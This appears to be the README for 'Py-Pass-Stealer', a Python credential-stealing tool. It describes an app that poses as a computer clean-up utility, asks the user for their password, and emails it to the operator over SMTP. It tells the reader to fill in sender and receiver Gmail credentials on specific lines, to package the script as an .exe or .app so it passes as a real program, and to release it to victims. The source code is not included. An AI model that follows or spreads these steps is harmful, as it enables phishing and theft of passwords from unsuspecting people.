# Py-Pass-Stealer

The Py-Pass-Stealer was created through the use of the module customtkinter and SMTPlib. It works on linux mac and windows.
It pretends to be a simple computer clean up program but really it gets the password of a user and uses SMTPlib to send it to you.
I would recomend converting it into a .exe or a .app but to do this you have to go to this link https://github.com/TomSchimansky/CustomTkinter/wiki/Packaging
which will tell you how to properly convert python scripts that use customtkinter.

HOW TO USE:

1) on line 10 it asks for your gmail that will send the password. On line 11 it asks for your gmail that will recieve the password. On line 12 it needs you to enter your sender email password.
2) then when you enter those things you can release it and then hope that they use it and input their password and when they hit the button it will send the password to you.
